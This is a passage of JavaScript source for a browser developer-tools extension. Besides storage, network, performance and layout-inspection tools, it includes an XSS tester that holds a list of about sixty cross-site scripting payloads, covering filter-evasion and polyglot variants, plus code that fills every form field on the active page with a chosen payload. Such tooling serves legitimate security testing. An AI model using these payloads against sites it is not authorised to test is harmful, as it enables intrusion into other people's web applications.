        data.issues.forEach(i => { html += `<div class="a11y-item a11y-error">${escapeHtml(i.msg)}</div>`; });
        html += '</div>';
      }

      if (data.warnings.length) {
        html += '<div class="info-section"><div class="info-section-title" style="color: #fbbf24">Warnings</div>';
        data.warnings.forEach(w => { html += `<div class="a11y-item a11y-warning">${escapeHtml(w)}</div>`; });
        html += '</div>';
      }

      if (data.passes.length) {
        html += '<div class="info-section"><div class="info-section-title" style="color: var(--success)">Passed</div>';
        data.passes.forEach(p => { html += `<div class="a11y-item a11y-pass">${escapeHtml(p)}</div>`; });
        html += '</div>';
      }

      // Stats
      html += `<div class="hint" style="margin-top: 6px">Scanned ${data.stats.elements} elements · ${data.stats.images} images · ${data.stats.forms} form inputs · ${data.stats.headings} headings</div>`;

      output.innerHTML = html;
    }).catch(e => showError(output, e.message));
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: CSS Outline Mode
// ═══════════════════════════════════════════════════════════════════════════

function renderOutlineTool(el) {
  el.innerHTML = `
    <div class="btn-row" style="flex-direction: column; gap: 6px">
      <button class="btn btn-primary" id="outline-all" style="width: 100%">Outline All Elements</button>
      <button class="btn" id="outline-semantic" style="width: 100%">Outline Semantic Elements</button>
      <button class="btn" id="outline-imgs" style="width: 100%">Highlight Images</button>
      <button class="btn btn-clear" id="outline-off" style="width: 100%">Remove All Outlines</button>
    </div>
    <div id="outline-status" class="hint" style="margin-top: 6px; text-align: center"></div>
  `;

  const statusEl = el.querySelector('#outline-status');

  function setActiveBtn(activeId) {
    ['outline-all', 'outline-semantic', 'outline-imgs'].forEach(id => {
      el.querySelector('#' + id).classList.toggle('btn-active', id === activeId);
      if (id === activeId) el.querySelector('#' + id).classList.remove('btn-primary');
    });
    el.querySelector('#outline-all').classList.toggle('btn-primary', !activeId);
  }

  function injectOutline(mode, btnId) {
    executeOnActiveTab((mode) => {
      // Remove existing
      const existing = document.getElementById('stingr-outline-style');
      if (existing) existing.remove();

      if (mode === 'off') return 'Outlines removed';

      const style = document.createElement('style');
      style.id = 'stingr-outline-style';

      if (mode === 'all') {
        style.textContent = `* { outline: 1px solid rgba(96, 165, 250, 0.5) !important; }
        div { outline-color: rgba(96, 165, 250, 0.5) !important; }
        section, article, aside, nav, main, header, footer { outline: 2px solid rgba(74, 222, 128, 0.7) !important; }
        a { outline-color: rgba(248, 113, 113, 0.7) !important; }
        p, h1, h2, h3, h4, h5, h6, span { outline-color: rgba(251, 191, 36, 0.5) !important; }`;
      } else if (mode === 'semantic') {
        style.textContent = `header, [role="banner"] { outline: 2px dashed #60a5fa !important; }
        nav, [role="navigation"] { outline: 2px dashed #4ade80 !important; }
        main, [role="main"] { outline: 2px dashed #fbbf24 !important; }
        aside, [role="complementary"] { outline: 2px dashed #c084fc !important; }
        footer, [role="contentinfo"] { outline: 2px dashed #f87171 !important; }
        section { outline: 1px dashed #6b7280 !important; }
        article { outline: 1px dashed #9ca3af !important; }`;
      } else if (mode === 'images') {
        style.textContent = `img { outline: 3px solid #f87171 !important; position: relative; }
        img[alt=""], img:not([alt]) { outline-color: #f87171 !important; box-shadow: 0 0 0 3px rgba(248, 113, 113, 0.3) !important; }
        img[alt]:not([alt=""]) { outline-color: #4ade80 !important; }`;
      }

      document.head.appendChild(style);
      return 'Outlines applied: ' + mode;
    }, [mode]).then(() => {
      if (mode === 'off') {
        setActiveBtn(null);
        statusEl.textContent = 'Outlines removed';
        clearInjection('outline');
      } else {
        setActiveBtn(btnId);
        const labels = { all: 'All elements outlined', semantic: 'Semantic elements outlined', images: 'Images highlighted' };
        statusEl.textContent = labels[mode] || '';
        markInjection('outline');
      }
    }).catch(() => {});
  }

  el.querySelector('#outline-all').addEventListener('click', () => injectOutline('all', 'outline-all'));
  el.querySelector('#outline-semantic').addEventListener('click', () => injectOutline('semantic', 'outline-semantic'));
  el.querySelector('#outline-imgs').addEventListener('click', () => injectOutline('images', 'outline-imgs'));
  el.querySelector('#outline-off').addEventListener('click', () => injectOutline('off', null));
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Ruler / Element Inspector
// ═══════════════════════════════════════════════════════════════════════════

function renderRulerTool(el) {
  el.innerHTML = `
    <div class="btn-row" style="flex-direction: column; gap: 6px">
      <button class="btn btn-primary" id="ruler-on" style="width: 100%">Enable Inspector</button>
      <button class="btn btn-clear" id="ruler-off" style="width: 100%">Disable Inspector</button>
    </div>
    <div class="hint" style="margin-top: 6px; text-align: center">Hover over elements to see dimensions. Click to lock.</div>
  `;

  el.querySelector('#ruler-on').addEventListener('click', () => {
    executeOnActiveTab(() => {
      if (window.__stingrRuler) return 'Already active';

      const overlay = document.createElement('div');
      overlay.id = 'stingr-ruler-overlay';
      overlay.style.cssText = 'position:fixed;pointer-events:none;z-index:999999;border:2px solid #60a5fa;background:rgba(96,165,250,0.08);transition:all 0.1s ease;display:none;';

      const label = document.createElement('div');
      label.id = 'stingr-ruler-label';
      label.style.cssText = 'position:fixed;z-index:999999;background:#111827;color:#f9fafb;font:11px/1.4 monospace;padding:4px 8px;border-radius:4px;pointer-events:none;white-space:nowrap;display:none;border:1px solid #374151;';

      document.body.appendChild(overlay);
      document.body.appendChild(label);

      let locked = false;

      function onMove(e) {
        if (locked) return;
        const el = document.elementFromPoint(e.clientX, e.clientY);
        if (!el || el === overlay || el === label) return;

        const rect = el.getBoundingClientRect();
        overlay.style.display = 'block';
        overlay.style.left = rect.left + 'px';
        overlay.style.top = rect.top + 'px';
        overlay.style.width = rect.width + 'px';
        overlay.style.height = rect.height + 'px';

        const style = getComputedStyle(el);
        const tag = el.tagName.toLowerCase();
        const cls = el.className && typeof el.className === 'string' ? '.' + el.className.trim().split(/\s+/).slice(0, 2).join('.') : '';
        label.innerHTML = `<b>${tag}${cls}</b><br>${Math.round(rect.width)} × ${Math.round(rect.height)}<br>padding: ${style.padding}<br>margin: ${style.margin}`;
        label.style.display = 'block';
        label.style.left = Math.min(e.clientX + 12, window.innerWidth - 200) + 'px';
        label.style.top = Math.min(e.clientY + 12, window.innerHeight - 80) + 'px';
      }

      function onClick(e) {
        e.preventDefault();
        e.stopPropagation();
        locked = !locked;
        overlay.style.borderColor = locked ? '#f87171' : '#60a5fa';
      }

      document.addEventListener('mousemove', onMove, true);
      document.addEventListener('click', onClick, true);

      window.__stingrRuler = { overlay, label, onMove, onClick };
      return 'Inspector enabled';
    }).then(() => {
      el.querySelector('#ruler-on').classList.add('btn-active');
      el.querySelector('#ruler-on').classList.remove('btn-primary');
      el.querySelector('#ruler-on').textContent = 'Inspector Active';
      markInjection('ruler');
    }).catch(() => {});
  });

  el.querySelector('#ruler-off').addEventListener('click', () => {
    executeOnActiveTab(() => {
      if (!window.__stingrRuler) return 'Not active';
      document.removeEventListener('mousemove', window.__stingrRuler.onMove, true);
      document.removeEventListener('click', window.__stingrRuler.onClick, true);
      window.__stingrRuler.overlay.remove();
      window.__stingrRuler.label.remove();
      delete window.__stingrRuler;
      return 'Inspector disabled';
    }).then(() => {
      el.querySelector('#ruler-on').classList.remove('btn-active');
      el.querySelector('#ruler-on').classList.add('btn-primary');
      el.querySelector('#ruler-on').textContent = 'Enable Inspector';
      clearInjection('ruler');
    }).catch(() => {});
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: LocalStorage / SessionStorage Viewer
// ═══════════════════════════════════════════════════════════════════════════

function renderStorageTool(el) {
  let activeStore = 'local';

  function render() {
    el.innerHTML = `
      <div class="btn-row">
        <button class="btn ${activeStore === 'local' ? 'btn-primary' : ''}" id="store-local">localStorage</button>
        <button class="btn ${activeStore === 'session' ? 'btn-primary' : ''}" id="store-session">sessionStorage</button>
        <button class="btn" id="store-add" title="Add new entry">+ Add</button>
      </div>
      <div id="store-output"></div>
    `;

    el.querySelector('#store-local').addEventListener('click', () => { activeStore = 'local'; render(); });
    el.querySelector('#store-session').addEventListener('click', () => { activeStore = 'session'; render(); });

    // Add new entry
    el.querySelector('#store-add').addEventListener('click', () => {
      const output = el.querySelector('#store-output');
      // Insert add form at top
      const existing = output.querySelector('.storage-add-form');
      if (existing) { existing.remove(); return; }
      const form = document.createElement('div');
      form.className = 'storage-add-form';
      form.innerHTML = `
        <input type="text" class="input-field" id="store-new-key" placeholder="Key" style="margin-bottom:4px">
        <textarea class="input-field" id="store-new-val" placeholder="Value" rows="2" style="margin-bottom:4px;resize:vertical"></textarea>
        <div class="btn-row">
          <button class="btn btn-primary" id="store-save-new">Save</button>
          <button class="btn" id="store-cancel-new">Cancel</button>
        </div>
      `;
      output.insertBefore(form, output.firstChild);
      form.querySelector('#store-cancel-new').addEventListener('click', () => form.remove());
      form.querySelector('#store-save-new').addEventListener('click', () => {
        const key = form.querySelector('#store-new-key').value.trim();
        const val = form.querySelector('#store-new-val').value;
        if (!key) return;
        executeOnActiveTab((type, key, val) => {
          const store = type === 'local' ? localStorage : sessionStorage;
          store.setItem(key, val);
          return true;
        }, [activeStore, key, val]).then(() => render());
      });
    });

    const output = el.querySelector('#store-output');
    showLoading(output);

    executeOnActiveTab((type) => {
      const store = type === 'local' ? localStorage : sessionStorage;
      const items = [];
      for (let i = 0; i < store.length; i++) {
        const key = store.key(i);
        let value = store.getItem(key);
        let isJson = false;
        try { JSON.parse(value); isJson = true; } catch {}
        items.push({ key, value, isJson, size: new Blob([value]).size });
      }
      return items;
    }, [activeStore]).then(items => {
      if (!items || items.length === 0) {
        output.innerHTML = `<div class="tool-empty">No ${activeStore === 'local' ? 'localStorage' : 'sessionStorage'} data</div>`;
        return;
      }

      const totalSize = items.reduce((sum, i) => sum + i.size, 0);
      let html = '';
      items.forEach((item, idx) => {
        const displayVal = item.value.length > 200 ? item.value.slice(0, 200) + '...' : item.value;
        html += `<div class="storage-card">
          <div class="storage-header">
            <span class="storage-key" data-copy="${escapeHtml(item.key)}">${escapeHtml(item.key)}</span>
            <span class="storage-size">${formatBytes(item.size)}</span>
            <button class="btn-tiny btn-edit" data-key="${escapeHtml(item.key)}" title="Edit">✎</button>
            <button class="btn-tiny btn-delete" data-key="${escapeHtml(item.key)}" title="Delete">✕</button>
          </div>
          <div class="storage-value ${item.isJson ? 'is-json' : ''}" data-copy="${escapeHtml(item.value)}">${escapeHtml(displayVal)}</div>
        </div>`;
      });
      html += `<div class="hint" style="margin-top: 6px">${items.length} item${items.length > 1 ? 's' : ''} · ${formatBytes(totalSize)} total · Click to copy</div>`;
      output.innerHTML = html;
      bindCopyAll(output);

      // Edit buttons
      output.querySelectorAll('.btn-edit').forEach(btn => {
        btn.addEventListener('click', () => {
          const key = btn.dataset.key;
          const item = items.find(i => i.key === key);
          if (!item) return;
          const card = btn.closest('.storage-card');
          const valueEl = card.querySelector('.storage-value');
          // Replace value with textarea
          const editor = document.createElement('div');
          editor.className = 'storage-edit-form';
          editor.innerHTML = `
            <textarea class="input-field" id="store-edit-val" rows="3" style="resize:vertical;margin-top:4px">${escapeHtml(item.value)}</textarea>
            <div class="btn-row" style="margin-top:4px">
              <button class="btn btn-primary btn-sm" id="store-edit-save">Save</button>
              <button class="btn btn-sm" id="store-edit-cancel">Cancel</button>
            </div>
          `;
          valueEl.replaceWith(editor);
          editor.querySelector('#store-edit-cancel').addEventListener('click', () => render());
          editor.querySelector('#store-edit-save').addEventListener('click', () => {
            const newVal = editor.querySelector('#store-edit-val').value;
            executeOnActiveTab((type, key, val) => {
              const store = type === 'local' ? localStorage : sessionStorage;
              store.setItem(key, val);
              return true;
            }, [activeStore, key, newVal]).then(() => render());
          });
        });
      });

      // Delete buttons
      output.querySelectorAll('.btn-delete').forEach(btn => {
        btn.addEventListener('click', () => {
          const key = btn.dataset.key;
          executeOnActiveTab((type, key) => {
            const store = type === 'local' ? localStorage : sessionStorage;
            store.removeItem(key);
            return true;
          }, [activeStore, key]).then(() => render());
        });
      });
    }).catch(e => showError(output, e.message));
  }

  render();
}

function formatBytes(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / 1048576).toFixed(1) + ' MB';
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Network / Resource Viewer
// ═══════════════════════════════════════════════════════════════════════════

function renderNetworkTool(el) {
  el.innerHTML = `
    <div class="btn-row">
      <button class="btn btn-primary" id="net-refresh">Load Resources</button>
      <select id="net-filter">
        <option value="">All</option>
        <option value="script">Scripts</option>
        <option value="link">Stylesheets</option>
        <option value="img">Images</option>
        <option value="xmlhttprequest">XHR/Fetch</option>
        <option value="other">Other</option>
      </select>
    </div>
    <div id="net-output"></div>
  `;

  function loadResources() {
    const filter = el.querySelector('#net-filter').value;
    const output = el.querySelector('#net-output');
    showLoading(output);

    executeOnActiveTab(() => {
      const entries = performance.getEntriesByType('resource');
      return entries.map(e => ({
        name: e.name,
        type: e.initiatorType,
        duration: Math.round(e.duration),
        size: e.transferSize || 0,
        encoded: e.encodedBodySize || 0,
        decoded: e.decodedBodySize || 0,
      }));
    }).then(resources => {
      if (!resources) { showError(output, 'Could not read resources'); return; }

      let filtered = resources;
      if (filter) {
        if (filter === 'other') {
          filtered = resources.filter(r => !['script', 'link', 'img', 'xmlhttprequest', 'fetch'].includes(r.type));
        } else if (filter === 'xmlhttprequest') {
          filtered = resources.filter(r => r.type === 'xmlhttprequest' || r.type === 'fetch');
        } else {
          filtered = resources.filter(r => r.type === filter);
        }
      }

      if (filtered.length === 0) {
        output.innerHTML = '<div class="tool-empty">No resources found</div>';
        return;
      }

      // Sort by duration descending
      filtered.sort((a, b) => b.duration - a.duration);

      const totalSize = filtered.reduce((sum, r) => sum + r.size, 0);
      let html = '';
      filtered.slice(0, 50).forEach(r => {
        const shortUrl = r.name.length > 60 ? '...' + r.name.slice(-57) : r.name;
        const barWidth = Math.min(100, (r.duration / Math.max(...filtered.map(x => x.duration))) * 100);
        html += `<div class="net-row">
          <div class="net-url" data-copy="${escapeHtml(r.name)}" title="${escapeHtml(r.name)}">${escapeHtml(shortUrl)}</div>
          <div class="net-meta">
            <span class="badge">${escapeHtml(r.type)}</span>
            <span>${r.duration}ms</span>
            <span>${formatBytes(r.size)}</span>
          </div>
          <div class="net-bar"><div class="net-bar-fill" style="width: ${barWidth}%"></div></div>
        </div>`;
      });

      html += `<div class="hint" style="margin-top: 6px">${filtered.length} resource${filtered.length > 1 ? 's' : ''} · ${formatBytes(totalSize)} total · Click URL to copy</div>`;
      output.innerHTML = html;
      bindCopyAll(output);
    }).catch(e => showError(output, e.message));
  }

  el.querySelector('#net-refresh').addEventListener('click', loadResources);
  el.querySelector('#net-filter').addEventListener('change', loadResources);
  loadResources();
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Test Data Generator
// ═══════════════════════════════════════════════════════════════════════════

function renderTestDataTool(el) {
  const generators = {
    uuid: () => crypto.randomUUID ? crypto.randomUUID() : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => { const r = Math.random() * 16 | 0; return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16); }),
    email: () => {
      const names = ['alice', 'bob', 'charlie', 'diana', 'emma', 'frank', 'grace', 'henry'];
      const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'example.com'];
      return names[Math.floor(Math.random() * names.length)] + Math.floor(Math.random() * 999) + '@' + domains[Math.floor(Math.random() * domains.length)];
    },
    name: () => {
      const first = ['James', 'Emma', 'Liam', 'Olivia', 'Noah', 'Ava', 'Sophia', 'Mason'];
      const last = ['Smith', 'Johnson', 'Brown', 'Taylor', 'Anderson', 'Thomas', 'Jackson'];
      return first[Math.floor(Math.random() * first.length)] + ' ' + last[Math.floor(Math.random() * last.length)];
    },
    phone: () => `(${Math.floor(Math.random() * 800) + 200}) ${Math.floor(Math.random() * 800) + 200}-${Math.floor(Math.random() * 9000) + 1000}`,
    timestamp: () => Math.floor(Date.now() / 1000) + '',
    isoDate: () => new Date(Date.now() - Math.floor(Math.random() * 365 * 24 * 60 * 60 * 1000)).toISOString(),
    number: () => Math.floor(Math.random() * 10000) + '',
    hex: () => '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0'),
    ip: () => `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
    password: () => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%';
      return Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    },
    lorem: () => {
      const words = ['lorem', 'ipsum', 'dolor', 'sit', 'amet', 'consectetur', 'adipiscing', 'elit', 'sed', 'do', 'eiusmod', 'tempor', 'incididunt', 'ut', 'labore', 'et', 'dolore', 'magna', 'aliqua'];
      const len = Math.floor(Math.random() * 20) + 10;
      return Array.from({ length: len }, () => words[Math.floor(Math.random() * words.length)]).join(' ') + '.';
    },
  };

  let html = '<div class="testdata-grid">';
  Object.entries(generators).forEach(([key]) => {
    const label = key === 'isoDate' ? 'ISO Date' : key === 'uuid' ? 'UUID' : key === 'ip' ? 'IP Address' : key.charAt(0).toUpperCase() + key.slice(1);
    html += `<div class="testdata-row">
      <span class="testdata-label">${label}</span>
      <span class="testdata-value" id="td-${key}"></span>
      <button class="btn-tiny" data-gen="${key}" title="Regenerate">↻</button>
    </div>`;
  });
  html += '</div>';
  html += '<button class="btn btn-primary" id="td-regen-all" style="width: 100%; margin-top: 8px">Regenerate All</button>';
  html += '<div class="hint" style="margin-top: 6px">Click any value to copy</div>';
  el.innerHTML = html;

  function generateAll() {
    Object.entries(generators).forEach(([key, gen]) => {
      const valEl = el.querySelector(`#td-${key}`);
      const val = gen();
      valEl.textContent = val;
      valEl.dataset.copy = val;
    });
    el.querySelectorAll('.testdata-value').forEach(v => {
      v.onclick = function () {
        navigator.clipboard.writeText(this.dataset.copy).then(() => flashCopied(this));
      };
    });
  }

  el.querySelectorAll('[data-gen]').forEach(btn => {
    btn.addEventListener('click', () => {
      const key = btn.dataset.gen;
      const val = generators[key]();
      const valEl = el.querySelector(`#td-${key}`);
      valEl.textContent = val;
      valEl.dataset.copy = val;
    });
  });

  el.querySelector('#td-regen-all').addEventListener('click', generateAll);
  generateAll();
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Viewport Resizer
// ═══════════════════════════════════════════════════════════════════════════

function renderViewportTool(el) {
  const presets = [
    { name: 'iPhone SE', w: 375, h: 667 },
    { name: 'iPhone 14', w: 390, h: 844 },
    { name: 'iPhone 14 Pro Max', w: 430, h: 932 },
    { name: 'iPad Mini', w: 768, h: 1024 },
    { name: 'iPad Pro', w: 1024, h: 1366 },
    { name: 'Laptop', w: 1366, h: 768 },
    { name: 'Desktop', w: 1920, h: 1080 },
    { name: 'Ultrawide', w: 2560, h: 1080 },
  ];

  let html = '<div class="tool-desc-text">Resize browser window to common viewports</div>';
  html += '<div id="vp-current" class="env-current" style="margin-bottom: 8px"></div>';
  html += '<div class="viewport-grid">';
  presets.forEach(p => {
    html += `<button class="viewport-btn" data-w="${p.w}" data-h="${p.h}">
      <span class="vp-name">${p.name}</span>
      <span class="vp-size">${p.w} × ${p.h}</span>
    </button>`;
  });
  html += '</div>';
  html += '<div class="info-section-title" style="margin-top: 10px">Custom Size</div>';
  html += '<div class="inline-row">';
  html += '<input type="number" id="vp-w" placeholder="Width" style="width: 80px">';
  html += '<span style="color: var(--text-muted)">×</span>';
  html += '<input type="number" id="vp-h" placeholder="Height" style="width: 80px">';
  html += '<button class="btn btn-primary" id="vp-apply">Apply</button>';
  html += '</div>';
  el.innerHTML = html;

  // Show current window size
  if (chrome.windows) {
    chrome.windows.getCurrent(win => {
      el.querySelector('#vp-current').innerHTML = `
        <span class="info-label">Current</span>
        <span class="env-host">${win.width} × ${win.height}</span>
      `;
    });
  }

  function resizeTo(w, h) {
    if (chrome.windows) {
      chrome.windows.getCurrent(win => {
        chrome.windows.update(win.id, { width: w, height: h }, () => {
          el.querySelector('#vp-current').innerHTML = `
            <span class="info-label">Current</span>
            <span class="env-host">${w} × ${h}</span>
          `;
        });
      });
    }
  }

  el.querySelectorAll('.viewport-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      resizeTo(parseInt(btn.dataset.w), parseInt(btn.dataset.h));
    });
  });

  el.querySelector('#vp-apply').addEventListener('click', () => {
    const w = parseInt(el.querySelector('#vp-w').value);
    const h = parseInt(el.querySelector('#vp-h').value);
    if (w && h) resizeTo(w, h);
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Performance Metrics
// ═══════════════════════════════════════════════════════════════════════════

function renderPerfTool(el) {
  el.innerHTML = `
    <button class="btn btn-primary" id="perf-run" style="width: 100%">Analyze</button>
    <div id="perf-output"></div>
  `;

  el.querySelector('#perf-run').addEventListener('click', () => {
    const output = el.querySelector('#perf-output');
    showLoading(output);

    executeOnActiveTab(() => {
      const nav = performance.getEntriesByType('navigation')[0] || {};
      const paint = performance.getEntriesByType('paint');
      const resources = performance.getEntriesByType('resource');

      const fcp = paint.find(p => p.name === 'first-contentful-paint');
      const fp = paint.find(p => p.name === 'first-paint');

      const timing = {
        dns: Math.round(nav.domainLookupEnd - nav.domainLookupStart) || 0,
        tcp: Math.round(nav.connectEnd - nav.connectStart) || 0,
        ttfb: Math.round(nav.responseStart - nav.requestStart) || 0,
        download: Math.round(nav.responseEnd - nav.responseStart) || 0,
        domParse: Math.round(nav.domInteractive - nav.responseEnd) || 0,
        domReady: Math.round(nav.domContentLoadedEventEnd - nav.fetchStart) || 0,
        fullLoad: Math.round(nav.loadEventEnd - nav.fetchStart) || 0,
        fp: fp ? Math.round(fp.startTime) : null,
        fcp: fcp ? Math.round(fcp.startTime) : null,
      };

      // DOM stats
      const allElements = document.querySelectorAll('*');
      const stats = {
        elements: allElements.length,
        scripts: document.querySelectorAll('script').length,
        stylesheets: document.querySelectorAll('link[rel="stylesheet"]').length,
        images: document.querySelectorAll('img').length,
        iframes: document.querySelectorAll('iframe').length,
        resources: resources.length,
        totalSize: resources.reduce((sum, r) => sum + (r.transferSize || 0), 0),
      };

      return { timing, stats };
    }).then(data => {
      if (!data) { showError(output, 'Could not read performance data'); return; }

      const { timing: t, stats: s } = data;
      let html = '';

      // Timing metrics
      html += '<div class="info-section"><div class="info-section-title">Timing</div><div class="perf-grid">';
      const metrics = [
        ['DNS Lookup', t.dns, 'ms'],
        ['TCP Connect', t.tcp, 'ms'],
        ['Time to First Byte', t.ttfb, 'ms'],
        ['Content Download', t.download, 'ms'],
        ['DOM Parsing', t.domParse, 'ms'],
        ['DOM Ready', t.domReady, 'ms'],
        ['Full Load', t.fullLoad, 'ms'],
      ];
      if (t.fp !== null) metrics.push(['First Paint', t.fp, 'ms']);
      if (t.fcp !== null) metrics.push(['First Contentful Paint', t.fcp, 'ms']);

      const maxVal = Math.max(...metrics.map(m => m[1]), 1);
      metrics.forEach(([name, value, unit]) => {
        const color = value < 200 ? 'var(--success)' : value < 1000 ? '#fbbf24' : 'var(--error)';
        const barWidth = Math.round((value / maxVal) * 100);
        html += `<div class="perf-row">
          <span class="perf-label">${name}</span>
          <span class="perf-value" style="color: ${color}">${value}${unit}</span>
          <div class="perf-bar"><div class="perf-bar-fill" style="width: ${barWidth}%; background: ${color}"></div></div>
        </div>`;
      });
      html += '</div></div>';

      // DOM stats
      html += '<div class="info-section"><div class="info-section-title">Page Stats</div><div class="info-table">';
      html += `<div class="info-row"><span class="info-label">DOM Elements</span><span class="info-value">${s.elements}</span></div>`;
      html += `<div class="info-row"><span class="info-label">Scripts</span><span class="info-value">${s.scripts}</span></div>`;
      html += `<div class="info-row"><span class="info-label">Stylesheets</span><span class="info-value">${s.stylesheets}</span></div>`;
      html += `<div class="info-row"><span class="info-label">Images</span><span class="info-value">${s.images}</span></div>`;
      html += `<div class="info-row"><span class="info-label">Iframes</span><span class="info-value">${s.iframes}</span></div>`;
      html += `<div class="info-row"><span class="info-label">Network Requests</span><span class="info-value">${s.resources}</span></div>`;
      html += `<div class="info-row"><span class="info-label">Total Transfer</span><span class="info-value">${formatBytes(s.totalSize)}</span></div>`;
      html += '</div></div>';

      output.innerHTML = html;
    }).catch(e => showError(output, e.message));
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: XSS Tester
// ═══════════════════════════════════════════════════════════════════════════

const XSS_PAYLOADS = {
  'Basic': [
    '<script>alert(1)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    "'\"><script>alert(1)</script>",
    "';alert(1)//",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
  ],
  'Event Handlers': [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<iframe onload=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
  ],
  'SVG / MathML': [
    '<svg><script>alert(1)</script></svg>',
    '<svg/onload=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x>',
    '<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>',
    '<svg><a><rect width=100% height=100% /><animate attributeName=href values=javascript:alert(1)>',
    '<svg><set attributeName=onmouseover value=alert(1)>',
    '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(1) /></svg>#x">',
  ],
  'Encoding / Bypass': [
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>alert`1`</script>',
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',
    '{{constructor.constructor("alert(1)")()}}',
  ],
  'DOM Based': [
    "'-alert(1)-'",
    "\\'-alert(1)//",
    '</script><script>alert(1)</script>',
    '${alert(1)}',
    '{{7*7}}',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    '<img src=x onerror=alert(1)//\n>',
    'javascript:/*--></title></style></textarea></script><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
  ],
  'Polyglots': [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik/telerik>",
    "'-alert(1)-'",
    '\'"--><svg/onload=alert()>',
    '<img/src=x onerror=alert(1)>',
    '"><svg/onload=alert(1)//',
    "javascript:alert(1)//\"'--></title></textarea></style></script><svg/onload=alert(1)>",
  ],
  'Filter Evasion': [
    '<img src=x onerror=alert(1) />',
    '<img/src="x"onerror=alert(1)>',
    '<img src=x onerror=\\u0061lert(1)>',
    '<img src=x onerror=al\\u0065rt(1)>',
    '<svg><script>al\\u0065rt(1)</script>',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<img src=x onerror=top[/al/.source+/ert/.source](1)>',
    '<img src=x onerror=window["alert"](1)>',
    '<img src=x onerror=self["alert"](1)>',
  ],
};

function renderXssTool(el) {
  const categories = Object.keys(XSS_PAYLOADS);

  el.innerHTML = `
    <div class="sqli-controls">
      <select id="xss-cat" style="flex: 1">
        ${categories.map(c => `<option value="${c}">${c} (${XSS_PAYLOADS[c].length})</option>`).join('')}
      </select>
      <button class="btn btn-primary" id="xss-inject">Inject All Fields</button>
    </div>
    <div id="xss-list"></div>
    <div id="xss-output" class="hidden"></div>
    <div class="hint" style="margin-top: 6px">Click a payload to copy. "Inject" fills all visible form fields on the page.</div>
  `;

  const catSelect = el.querySelector('#xss-cat');
  const listEl = el.querySelector('#xss-list');

  function renderPayloads() {
    const cat = catSelect.value;
    const payloads = XSS_PAYLOADS[cat];
    listEl.innerHTML = '<div class="sqli-payloads">' + payloads.map((p, i) =>
      `<div class="sqli-row">
        <span class="sqli-index">${i + 1}</span>
        <code class="sqli-payload" data-copy="${escapeHtml(p)}">${escapeHtml(p)}</code>
        <button class="btn-tiny sqli-use" data-idx="${i}" title="Inject this one">&#9654;</button>
      </div>`
    ).join('') + '</div>';
    bindCopyAll(listEl);

    listEl.querySelectorAll('.sqli-use').forEach(btn => {
      btn.addEventListener('click', () => {
        const payload = payloads[parseInt(btn.dataset.idx)];
        injectXssPayload(payload);
      });
    });
  }

  function injectXssPayload(payload) {
    executeOnActiveTab((payload) => {
      let filled = 0;
      document.querySelectorAll('input, textarea').forEach(inp => {
        if (inp.type === 'hidden' || inp.type === 'submit' || inp.type === 'button' ||
            inp.type === 'checkbox' || inp.type === 'radio' || inp.type === 'file' ||
            inp.disabled || inp.readOnly) return;
        const setter = Object.getOwnPropertyDescriptor(
          inp.tagName === 'TEXTAREA' ? window.HTMLTextAreaElement.prototype : window.HTMLInputElement.prototype, 'value'
        ).set;
        setter.call(inp, payload);
        inp.dispatchEvent(new Event('input', { bubbles: true }));
        inp.dispatchEvent(new Event('change', { bubbles: true }));
        filled++;
      });
      return filled;
    }, [payload]).then(count => {
      const output = el.querySelector('#xss-output');
      output.innerHTML = `<div class="tool-success">Injected into ${count} field${count !== 1 ? 's' : ''}</div>`;
      output.classList.remove('hidden');
      setTimeout(() => output.classList.add('hidden'), 2000);
    }).catch(e => {
